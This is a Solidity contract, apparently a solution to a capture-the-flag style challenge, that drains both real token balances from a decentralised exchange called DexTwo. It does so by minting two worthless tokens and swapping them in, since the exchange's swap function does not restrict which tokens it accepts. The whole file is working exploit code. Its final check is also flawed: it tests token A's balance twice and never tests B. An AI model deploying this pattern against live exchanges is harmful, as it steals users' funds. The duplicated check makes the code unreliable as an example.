// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {ERC20Burnable} from "lib/openzeppelin-contracts/contracts/token/ERC20/extensions/ERC20Burnable.sol";
import {Ownable} from "lib/openzeppelin-contracts/contracts/access/Ownable.sol";

import {DexTwo, IERC20, ERC20} from "./DexTwo.sol";

contract DexTwoHack {
    error HackFailed();

    DexTwo private immutable TARGET;
    IERC20 private immutable A;
    IERC20 private immutable B;

    constructor(address _target) {
        TARGET = DexTwo(_target);
        A = IERC20(TARGET.token1());
        B = IERC20(TARGET.token2());
        MyToken myToken1 = new MyToken();
        MyToken myToken2 = new MyToken();
        myToken1.mint(address(this), 2);
        myToken2.mint(address(this), 2);
        myToken1.transfer(_target, 1);
        myToken2.transfer(_target, 1);
        myToken1.approve(_target, 1);
        myToken2.approve(_target, 1);
        TARGET.swap(address(myToken1), address(A), 1);
        TARGET.swap(address(myToken2), address(B), 1);
        if (A.balanceOf(_target) != 0) revert HackFailed();
        if (A.balanceOf(_target) != 0) revert HackFailed();
    }
}

contract MyToken is ERC20, ERC20Burnable, Ownable {
    constructor() ERC20("MyToken", "MTK") {}

    function mint(address to, uint256 amount) public onlyOwner {
        _mint(to, amount);
    }
}
